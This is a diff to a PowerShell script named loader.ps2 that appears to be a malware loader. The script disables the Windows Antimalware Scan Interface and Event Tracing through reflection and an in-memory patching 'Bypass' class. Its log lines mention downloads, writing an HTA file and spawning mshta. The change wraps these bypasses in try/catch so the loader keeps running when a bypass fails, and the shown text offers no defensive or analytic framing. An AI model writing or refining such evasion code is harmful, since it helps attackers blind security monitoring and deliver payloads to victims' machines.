@@ -35,8 +35,12 @@ Write-Log "[*] loader.ps2 started - scriptBase=$scriptBase logFile=$logFile"
 if ($WhatIf) {
     Write-Log "[WHATIF] Skipping AMSI/ETW reflect, Bypass.Add-Type, downloads, HTA write, mshta spawn, and probe wait"
 } else {
-    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-    [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').SetValue($null,$null)
+    try {
+        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+    } catch { Write-Log "[!] AMSI reflect skipped: $_" }
+    try {
+        [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').SetValue($null,$null)
+    } catch { Write-Log "[!] ETW reflect skipped: $_" }
 }
 
 # -- AMSI/ETW Bypass via reflective .NET (VirtualProtect + Marshal.Copy) --
@@ -62,10 +66,12 @@ public class Bypass {
 }
 '@
 if (-not $WhatIf) {
-    Add-Type $BypassCode -ErrorAction Stop
-    [Bypass]::Go()
+    try {
+        Add-Type $BypassCode -ErrorAction Stop
+        [Bypass]::Go()
+    } catch { Write-Log "[!] Bypass Add-Type failed: $_" }
 }
-Write-Log "[+] AMSI/ETW patched"
+Write-Log "[+] AMSI/ETW patched (best-effort)"
 
 # -- Scatter directories --
 $scatterDirs = @(
